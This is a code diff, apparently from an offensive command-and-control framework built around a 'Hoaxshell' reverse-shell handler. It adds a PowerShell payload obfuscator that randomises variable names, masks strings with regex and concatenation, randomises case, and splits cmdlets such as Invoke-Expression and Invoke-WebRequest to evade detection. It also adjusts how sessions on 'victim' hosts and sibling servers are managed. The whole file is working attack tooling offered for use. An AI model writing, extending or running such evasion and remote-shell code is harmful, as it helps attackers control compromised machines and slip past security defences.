@@ -17,7 +17,7 @@ from string import ascii_uppercase, ascii_lowercase
 from pyperclip import copy as copy2cb
 from uuid import uuid4
 from ast import literal_eval
-from random import randint, choice
+from random import randint, choice, randrange
 from .common import *
 from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings
 
@@ -45,14 +45,16 @@ ssl_support = True if Hoaxshell_settings.certfile and Hoaxshell_settings.keyfile
 
 class Payload_generator:
 
+
 	def __init__(self):
 		self.obfuscator = Obfuscator()
+
 
 
 	def encodePayload(self, payload):
 		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 		return enc_payload
-		# ~ print(f'{PLOAD}{enc_payload}{END}')
+
 
 
 	def args_to_dict(self, args_list):
@@ -84,9 +86,8 @@ class Payload_generator:
 				
 		boolean_args = {
 			'raw' : False,
-			'obfuscate' : False,
+			'obfuscate' : False,		
 			'constraint_mode' : False,
-			'invoke_restmethod' : False,
 			'trusted_domain' : False
 		}
 		
@@ -132,7 +133,7 @@ class Payload_generator:
 				frequency = args_dict['frequency']
 				
 			else:
-				print('Error parsing FREQUENCY. Invalid value type.')
+				print('Error parsing FREQUENCY. Invalid type.')
 				return 1				
 				
 		else:	
@@ -170,11 +171,35 @@ class Payload_generator:
 
 
 
+		# ~ ''' Parse OBFUSCATE '''
+		# ~ support = ['windows']
+		# ~ obf_level = False
+		
+		# ~ if args_dict['os'] in support:
+			# ~ if 'obfuscate' in arguments:
+				
+				# ~ try:
+					# ~ obf_level = int(args_dict['obfuscate'])
+					
+				# ~ except:
+					# ~ print('Error parsing OBFUSCATE. Invalid type.')
+					# ~ return 1
+			
+				# ~ if not ((obf_level >= 1) and (obf_level <=2)):
+					# ~ print('Obfuscate value can be between 1-2.')
+					# ~ return 1
+					
+		# ~ else:
+			# ~ print(f'Ignoring argument "obfuscate" (not supported for {args_dict["os"]} payloads)')
+
+
+
+
 		''' Parse BOOLEAN '''
 		
 		for item in boolean_args.keys():
 			if (item in arguments) and (os_type == 'windows'):
-				
+
 				if args_dict[item] == 'true':
 					boolean_args[item] = True
 					
@@ -183,6 +208,7 @@ class Payload_generator:
 					
 				else:
 					print(f'Invalid value for {boolean_args[item]} (type: BOOLEAN).')
+					return 1
 			# ~ else:
 				# ~ boolean_args[item] = False
 		# ~ else:
@@ -228,16 +254,13 @@ class Payload_generator:
 		payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
 			frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id)
 		
-		if boolean_args['invoke_restmethod']:
-			payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
-
 		if exec_outfile:
 			payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
 		
 		if boolean_args['constraint_mode']:
 			payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
 		
-		Sessions_manager.legit_session_ids[session_unique_id]={
+		Sessions_manager.legit_session_ids[session_unique_id] = {
 			'OS Type' : args_dict['os'].capitalize(),
 			'constraint_mode' : boolean_args['constraint_mode'],
 			'frequency' : frequency
@@ -300,34 +323,47 @@ class Obfuscator:
 	
 	def string_to_regex(self, string):
 		
-		regex = ''
-		str_length = len(string)
-		chars_used = 0
-		c = 0
-		
-		while True:
-
-			chars_left = (str_length - chars_used)			
+		# First check if string is actually a regex string
+		if re.match( "^\[.*\}$", string):
+			return string
 			
-			if chars_left:
+		else:
+			
+			legal = False
+			
+			while not legal:
+				regex = ''
+				str_length = len(string)
+				chars_used = 0
+				c = 0
 				
-				pair_length = randint(1, chars_left)
-				regex += '['
-				
-				for i in range(c, pair_length + c):
+				while True:
 
-					masked = self.mask_char(string[i])
-					regex += masked
-					c += 1
+					chars_left = (str_length - chars_used)			
 					
-				chars_used += pair_length
-				
-				regex += ']{' + str(pair_length) + '}'
+					if chars_left:
+						
+						pair_length = randint(1, chars_left)
+						regex += '['
+						
+						for i in range(c, pair_length + c):
 
-			else:
-				break
-		
-		return regex
+							masked = self.mask_char(string[i])
+							regex += masked
+							c += 1
+							
+						chars_used += pair_length
+						
+						regex += ']{' + str(pair_length) + '}'
+
+					else:
+						break
+				
+				# Test generated regex
+				if re.match(regex, string):
+					legal = True
+			
+			return regex
 
 
 
@@ -364,21 +400,63 @@ class Obfuscator:
 				break	
 	
 		return concat
+
+
+
+	def get_random_str(self, main_str, substr_len):
 		
+		index = randrange(1, len(main_str) - substr_len + 1) 
+		return main_str[index : (index + substr_len)]
+
+
+
+	def obfuscate_cmdlet(self, main_str):
+		
+		main_str_length = len(main_str)
+		substr_len = main_str_length - (randint(1, (main_str_length - 2)))
+		sub = self.get_random_str(main_str, substr_len)
+		sub_quoted = f"'{sub}'"
+		obf_cmdlet = main_str.replace(sub, sub_quoted)
+		return obf_cmdlet		
+
+
+
+	def get_rand_var_name(self):
+		
+		_max = randint(1,6)
+		legal = False
+		
+		while not legal:
+			
+			obf = str(uuid4())[0:_max]
+			
+			if obf in ['t', 'tr', 'tru', 'true']:
+				continue
+				
+			else:
+				legal = True
+		
+		return obf
+		
+			
 
 	def mask_payload(self, payload):
 		
-		# Obfuscate variable names
+		# Obfuscate variable definition names
 		variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
 		
 		if variables:
 						
 			for var in variables:				
 				var = var.strip("=")	
-				_max = randint(1,6)
-				obf = str(uuid4())[0:_max]				
+				obf = self.get_rand_var_name()
 				payload = payload.replace(var, f'${obf}')
 
+
+		# Randomize error variable name
+		obf = self.get_rand_var_name()
+		payload = payload.replace('-ErrorVariable e', f'-ErrorVariable {obf}')
+		payload = payload.replace('$e+', f'${obf}+')
 		
 		
 		# Obfuscate strings
@@ -386,43 +464,80 @@ class Obfuscator:
 		
 		if strings:
 			for string in strings:
-
-				string_length = len(string)
-				method = randint(0, 1)
+				if string not in ['', ' ']:
 					
-				if method == 0: # String to regex
-					
-					_max = randint(3,8)
-					random_string = str(uuid4())[0:_max]				
-					regex = self.string_to_regex(random_string)
-					replace_obf = self.randomize_case('-replace')
-					payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
-				
-				elif method == 1: # Concatenate string
-					
-					submethod = randint(0, 1)
-					string = string.strip("'")
-					concat = self.concatenate_string(string)
-					
-					if submethod == 0: # return raw
-						payload = payload.replace(f"'{string}'", concat)
+					string_length = len(string)
+					method = randint(0, 1)
 						
-					elif submethod == 1: # retrun execute instance
-						payload = payload.replace(f"'{string}'", f"$({concat})")
+					if method == 0: # String to regex
+						
+						_max = randint(3,8)
+						random_string = str(uuid4())[0:_max]				
+						regex = self.string_to_regex(random_string)
+						replace_obf = self.randomize_case('-replace')
+						payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
 					
-		return payload
-				
-
+					elif method == 1: # Concatenate string
+						
+						submethod = randint(0, 1)
+						string = string.strip("'")
+						concat = self.concatenate_string(string)
+						
+						if submethod == 0: # return raw
+							payload = payload.replace(f"'{string}'", concat)
+							
+						elif submethod == 1: # return call
+							payload = payload.replace(f"'{string}'", f"$({concat})")
+					
 		
+					
 		# Randomize the case of each char in parameter names
 		ps_parameters = re.findall("\s-[A-Za-z]*", payload)
-		
+
 		if ps_parameters:		
 			for param in ps_parameters:			
 				param = param.strip()
 				rand_param_case = self.randomize_case(param)
 				payload = payload.replace(param, rand_param_case)
 
+
+
+		# Spontaneous replacements
+		alternatives = {
+			'Invoke-WebRequest' : 'iwr',
+			'Invoke-Expression' : 'iex',
+			'Invoke-RestMethod' : 'irm'
+		}
+		
+		for alt in alternatives.keys():
+			
+			p = randint(0,1)
+			
+			if p == 0:
+				payload = payload.replace(alt, alternatives[alt])
+				
+			else:
+				pass
+
+
+
+		# Randomize char case of specified components
+		components = ['Out-String', 'Invoke-WebRequest', 'iwr', 'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', 'Invoke-RestMethod', 'irm']
+	
+		for i in range(0, len(components)):
+			rand_case = self.randomize_case(components[i])
+			payload = payload.replace(components[i], rand_case)
+			components[i] = rand_case
+		
+		
+		# Obfuscate cmdlets
+		for i in range(0, len(components)):
+			if (components[i].count('.') == 0) and components[i] not in ['while']:
+				obf_cmdlet = self.obfuscate_cmdlet(components[i])
+				payload = payload.replace(components[i], obf_cmdlet)
+		
+		return payload
+		
 
 
 
@@ -578,26 +693,26 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			if sibling_signature:
 				output = output.replace('{' + sibling_signature + '}', '')
 								
-			tmp = output.rsplit("Path", 1)
-			output = tmp[0]
-			junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
-			output = output.rsplit("Drive", 1)[0] if junk else output
+			# ~ tmp = output.rsplit("Path", 1)
+			# ~ output = tmp[0]
+			# ~ junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
+			# ~ output = output.rsplit("Drive", 1)[0] if junk else output
 			
-			if self.active_shell:
+			# ~ if self.active_shell:
 				
-				if self.init_dir == None:
-					p = tmp[-1].strip().rsplit("\n")[-1]
-					p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-					self.init_dir = p
+				# ~ if self.init_dir == None:
+					# ~ p = tmp[-1].strip().rsplit("\n")[-1]
+					# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+					# ~ self.init_dir = p
 											
-				# ~ if not exec_outfile:						
+				# ~ if not exec_outfile: # delete			
 					# ~ p = tmp[-1].strip().rsplit("\n")[-1]
 					# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
 					
-				else:
-					p = Hoaxshell.init_dir
+				# ~ else:
+					# ~ p = Hoaxshell.init_dir
 					
-				self.shell_prompt = f"PS {p}> "
+				# ~ self.shell_prompt = f"PS {p}> "
 				# ~ self.set_shell_prompt_ready()
 				# ~ self.rst_promt_required = False
 
@@ -612,13 +727,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			output = output.strip() + '\n' if output.strip() != '' else output.strip()
 		
 		return output if not sibling_signature else [sibling_signature, output]
-
-
-
-	def rst_shell_prompt(self, force_rst = False, prompt = ' > ', prefix = '\r'):
-		
-		Hoaxshell.prompt_ready = True
-		# ~ sys.stdout.write(prefix + prompt + readline.get_line_buffer())
 
 
 
@@ -702,6 +810,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		Hoaxshell.prompt_ready = True
 		Hoaxshell.init_dir = None	
 		Main_prompt.main_prompt_ready = True	
+
+
+
+	def rst_shell_prompt(self, force_rst = False, prompt = ' > ', prefix = '\r'):
+		
+		Hoaxshell.prompt_ready = True
+		# ~ sys.stdout.write(prefix + prompt + readline.get_line_buffer())
 
 
 
@@ -1025,7 +1140,8 @@ class Core_server:
 		
 		try:
 			Threading_params.thread_limiter.acquire()
-			raw_data = conn.recv(Core_server_settings.CLIENT_BUFFER_SIZE) 
+			raw_data = conn.recv(Core_server_settings.CLIENT_BUFFER_SIZE)
+			Main_prompt.main_prompt_ready = False
 
 			# There are 3 defined byte sequences for recognizing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
 			# Check if raw_data is a connection request
@@ -1125,7 +1241,6 @@ class Core_server:
 								data['command'] = "split-path $pwd'\\0x00'"	
 													
 							Hoaxshell.command_pool[data['session_id']].append(data['command'] + ";pwd")
-
 							conn.send(self.response_ack(sibling_id))
 							
 							
@@ -1135,7 +1250,13 @@ class Core_server:
 						
 						print(f'\r{GREEN}{decrypted_data[1]}{END}')					
 						conn.send(self.response_ack(sibling_id))
-						Main_prompt.set_main_prompt_ready()
+						
+						# ~ if not Hoaxshell.active_shell:
+							# ~ Main_prompt.rst_prompt(force_rst = True)
+						# ~ else:
+							# ~ Hoaxshell.prompt_ready = True
+						if Hoaxshell.active_shell:
+							Hoaxshell.prompt_ready = True
 
 
 
@@ -1147,9 +1268,11 @@ class Core_server:
 						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]
 							
 						print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END}] (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
+						Main_prompt.rst_prompt(force_rst = True)
 						del decrypted_data, new_session_id
 						
 						conn.send(self.response_ack(sibling_id))
+
 
 
 
@@ -1163,11 +1286,13 @@ class Core_server:
 
 
 
+
 					elif decrypted_data[0] == 'session_terminated':
 						
 						victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
 						Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
-						print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')		
+						print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
+						Main_prompt.rst_prompt(force_rst = True)
 						del victim_ip
 						
 						conn.send(self.response_ack(sibling_id))
@@ -1179,26 +1304,30 @@ class Core_server:
 						server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
 						hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
 						self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)					
-						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')		
+						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
+						Main_prompt.rst_prompt(force_rst = True)
 						del server_ip, hostname
-						
+								
 						conn.send(self.response_ack(sibling_id))					
 										
 
 
 					elif decrypted_data[0] == 'are_you_alive':
-						conn.send(self.response_ack(sibling_id))	
+						conn.send(self.response_ack(sibling_id))
+							
 									
 									
 					else:
 						return					
 						# ~ rst_prompt(force_rst = True)
 										
-						
+			# ~ Main_prompt.rst_prompt(force_rst = True)		
+			
 		except:
 			print('failed to process a request')
 			pass				
-				
+		
+		Main_prompt.main_prompt_ready = True
 		# ~ Main_prompt.rst_prompt(force_rst = True)
 		Threading_params.thread_limiter.release()
 
@@ -1378,7 +1507,6 @@ class Core_server:
 				shells_data[session_id]['alias'] = None
 				shells_data[session_id]['aliased'] = False
 				shells_data[session_id]['self_owned'] = False
-				print(shells_data[session_id])
 				Sessions_manager.active_sessions[session_id] = shells_data[session_id]
 						
 
@@ -1518,7 +1646,8 @@ class Core_server:
 					siblings_status_monitor.daemon = True
 					siblings_status_monitor.start()
 					
-		Main_prompt.rst_prompt(force_rst = True)
+		# ~ Main_prompt.main_prompt_ready = True
+		
 		
 
 	@staticmethod	
